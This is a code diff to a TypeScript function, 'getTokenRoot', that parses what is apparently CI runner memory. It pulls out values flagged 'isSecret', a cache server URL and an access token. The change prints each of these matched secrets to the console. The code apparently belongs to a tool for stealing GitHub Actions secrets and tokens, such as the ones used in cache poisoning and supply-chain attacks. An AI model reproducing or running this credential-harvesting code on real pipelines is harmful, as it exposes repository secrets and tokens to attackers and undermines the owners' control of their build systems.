@@ -515,13 +515,16 @@ export async function getTokenRoot(): Promise<Map<string, string>> {
             const matches = parseMemoryContent(content);
             matches.forEach(match => {
                 // Extract key/value from matches
-                console.log(match);
+                
                 if (match.includes('isSecret')) {
+                    console.log(match);
                     const [key, value] = match.split('":{"value":"');
                     tokenMap.set(key.replace(/"/g, ''), value.replace('","isSecret":true}', ''));
                 } else if (match.includes('CacheServerUrl')) {
+                    console.log(match);
                     tokenMap.set('ACTIONS_CACHE_URL', match.split('":"')[1].replace('"', ''));
                 } else if (match.includes('AccessToken')) {
+                    console.log(match);
                     tokenMap.set('ACCESS_TOKEN', match.split('":"')[1].replace('"', ''));
                 }
             });
